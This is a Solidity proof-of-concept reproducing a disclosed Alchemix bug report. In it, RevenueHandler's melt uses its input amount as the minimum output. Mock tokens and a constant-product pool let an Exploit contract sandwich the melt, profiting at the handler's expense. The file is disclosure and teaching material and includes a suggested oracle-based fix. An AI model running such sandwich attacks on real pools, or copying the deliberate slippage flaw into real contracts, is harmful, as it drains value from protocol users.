// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Slippage protection is inaccurate (RevenueHandler._melt)
    (Immunefi, jasonxiale, finding #38184)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: RevenueHandler._melt(revenueToken) swaps a revenue token
    (e.g. WETH) for an alAsset (e.g. alETH) through a pool adapter, passing
    `revenueTokenBalance` (the INPUT amount) as BOTH the amount in AND the
    `minimumAmountOut` -- i.e. it assumes the two assets trade 1:1. In
    reality alETH trades at a discount to WETH (roughly 30:27 per the
    finding), so a healthy pool naturally returns MORE alETH than input WETH.
    But because the "protection" is just "amountOut >= amountIn" instead of
    a real oracle-anchored minimum, an attacker can sandwich the melt: push
    the pool's price down right before the melt (front-run), let the melt
    execute at the degraded rate (still clearing the trivial amountIn
    threshold), then push the price back and pocket the difference
    (back-run) -- extracting value that should have gone to alETH holders.
//////////////////////////////////////////////////////////////////////////*/

contract MockWETH {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockAlETH {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal constant-product (x*y=k, no fee) WETH/alETH pool, standing
///         in for the real Curve-style pool the finding references
///         (get_dy / exchange). Reserves start at a ratio favoring alETH
///         (matching the finding's observation that alETH trades at a
///         slight discount to WETH, so a healthy WETH->alETH swap nets
///         MORE alETH than WETH in).
contract Pool {
    MockWETH public immutable WETH_TOKEN;
    MockAlETH public immutable ALETH_TOKEN;
    uint256 public reserveWeth;
    uint256 public reserveAleth;

    constructor(MockWETH weth, MockAlETH aleth, uint256 initialWeth, uint256 initialAleth) {
        WETH_TOKEN = weth;
        ALETH_TOKEN = aleth;
        reserveWeth = initialWeth;
        reserveAleth = initialAleth;
    }

    function getDyWethToAleth(uint256 dx) public view returns (uint256) {
        return (reserveAleth * dx) / (reserveWeth + dx);
    }

    function getDyAlethToWeth(uint256 dx) public view returns (uint256) {
        return (reserveWeth * dx) / (reserveAleth + dx);
    }

    /// @notice Swap WETH -> alETH. Caller must have approved/pre-funded this
    ///         contract with `dx` WETH (transferFrom mimics a real router).
    function swapWethToAleth(uint256 dx, uint256 minDy) external returns (uint256 dy) {
        dy = getDyWethToAleth(dx);
        require(dy >= minDy, "slippage");
        WETH_TOKEN.transferFrom(msg.sender, address(this), dx);
        reserveWeth += dx;
        reserveAleth -= dy;
        ALETH_TOKEN.mint(msg.sender, dy);
    }

    /// @notice Swap alETH -> WETH (the back-run direction).
    function swapAlethToWeth(uint256 dx, uint256 minDy) external returns (uint256 dy) {
        dy = getDyAlethToWeth(dx);
        require(dy >= minDy, "slippage");
        ALETH_TOKEN.transferFrom(msg.sender, address(this), dx);
        reserveAleth += dx;
        reserveWeth -= dy;
        WETH_TOKEN.transfer(msg.sender, dy);
    }
}

/// @notice Reduced RevenueHandler modeling the vulnerable _melt() call.
contract RevenueHandler {
    MockWETH public immutable WETH_TOKEN;
    Pool public immutable POOL_ADAPTER;

    constructor(MockWETH weth, Pool poolAdapter) {
        WETH_TOKEN = weth;
        POOL_ADAPTER = poolAdapter;
    }

    /// @notice src/RevenueHandler.sol::_melt (reduced). The real function
    ///         safeTransfers revenueTokenBalance to the poolAdapter, which
    ///         then swaps it; here the Pool pulls WETH via transferFrom
    ///         (mirroring the same net effect) directly from this balance.
    function melt() external returns (uint256) {
        uint256 revenueTokenBalance = WETH_TOKEN.balanceOf(address(this));
        if (revenueTokenBalance == 0) return 0;

        /*
            minimumAmountOut == inputAmount
            Here we are making the assumption that the price of the alAsset will always be at or below the price of the revenue token.
            This is currently a safe assumption since this imbalance has always held true for alUSD and alETH since their inceptions.
        */
        // @> VULN: revenueTokenBalance is used as BOTH the amount in AND the
        //          minimumAmountOut -- assuming a 1:1 WETH:alETH rate. A
        //          manipulated pool can return an amount just barely above
        //          this trivial threshold, far below the pool's UN-
        //          manipulated (fair) rate, with the difference captured by
        //          whoever manipulated the price.
        return POOL_ADAPTER.swapWethToAleth(revenueTokenBalance, revenueTokenBalance);
        // FIX: derive minimumAmountOut from an external fair-price oracle
        //      (e.g. Chainlink WETH/alETH or a TWAP) with a bounded slippage
        //      tolerance, not from the naive assumption that the swap rate
        //      is always >= 1:1.
    }
}

contract Exploit {
    MockWETH public weth;
    MockAlETH public aleth;
    Pool public pool;
    RevenueHandler public revenueHandler;

    // Pool starts at a 1000:1120 WETH:alETH ratio (alETH trades at a
    // discount to WETH, matching the finding's ~30:27 observation --
    // healthy WETH->alETH swaps net MORE alETH than WETH in).
    uint256 public constant INITIAL_WETH_RESERVE = 1_000_000 ether;
    uint256 public constant INITIAL_ALETH_RESERVE = 1_120_000 ether;

    uint256 public constant REVENUE_WETH = 1_000 ether; // RevenueHandler's WETH to melt
    uint256 public constant ATTACKER_FRONTRUN_WETH = 50_000 ether; // attacker's front-run swap size

    constructor() {
        weth = new MockWETH();
        aleth = new MockAlETH();
        pool = new Pool(weth, aleth, INITIAL_WETH_RESERVE, INITIAL_ALETH_RESERVE);
        revenueHandler = new RevenueHandler(weth, pool);

        // Fund the pool's counterparty balances so it can pay out swaps.
        aleth.mint(address(pool), INITIAL_ALETH_RESERVE);
        weth.mint(address(pool), INITIAL_WETH_RESERVE);

        // Fund RevenueHandler with 1000 WETH of revenue to melt.
        weth.mint(address(revenueHandler), REVENUE_WETH);

        // Fund the attacker (this Exploit contract) with enough WETH to
        // front-run the pool.
        weth.mint(address(this), ATTACKER_FRONTRUN_WETH);
    }

    function run() external {
        // Baseline: what RevenueHandler WOULD receive melting into an
        // UNMANIPULATED pool (the fair rate).
        uint256 fairDy = pool.getDyWethToAleth(REVENUE_WETH);
        require(fairDy > REVENUE_WETH, "sanity: unmanipulated pool pays MORE alETH than WETH in (alETH trades at a discount)");

        uint256 attackerWethBefore = weth.balanceOf(address(this));

        // --- FRONT-RUN: attacker swaps a large amount of WETH -> alETH,
        //     driving the alETH price UP (pool now needs more WETH per
        //     alETH), so RevenueHandler's upcoming swap gets a WORSE rate. ---
        uint256 attackerAlethFromFrontrun = pool.swapWethToAleth(ATTACKER_FRONTRUN_WETH, 0);

        // --- VICTIM: RevenueHandler melts its 1000 WETH revenue at the now-
        //     degraded rate. The naive minOut (== inputAmount) still passes,
        //     but the amount received is far below the fair (unmanipulated)
        //     rate. ---
        uint256 aliceDy = revenueHandler.melt();
        require(aliceDy >= REVENUE_WETH, "sanity: melt() should still clear the naive minOut check");
        require(aliceDy < fairDy, "harm not demonstrated: RevenueHandler should receive LESS alETH than the fair, unmanipulated rate");

        // --- BACK-RUN: attacker swaps the alETH bought during the front-run
        //     back to WETH, at the now further-inflated alETH price (both
        //     the attacker's own front-run AND RevenueHandler's melt pushed
        //     the price the same direction), realizing a profit. ---
        uint256 attackerWethFromBackrun = pool.swapAlethToWeth(attackerAlethFromFrontrun, 0);
        attackerWethFromBackrun; // (also minted directly to msg.sender by Pool.swapAlethToWeth)

        uint256 attackerWethAfter = weth.balanceOf(address(this));

        // HARM confirmed: the attacker's round-trip (buy alETH low, let the
        // victim's trade push the price up further, sell alETH high) nets a
        // real WETH profit -- extracted at RevenueHandler's expense, whose
        // melt executed at a rate worse than fair.
        require(attackerWethAfter > attackerWethBefore, "harm not demonstrated: attacker should profit in WETH from the sandwich");
    }
}
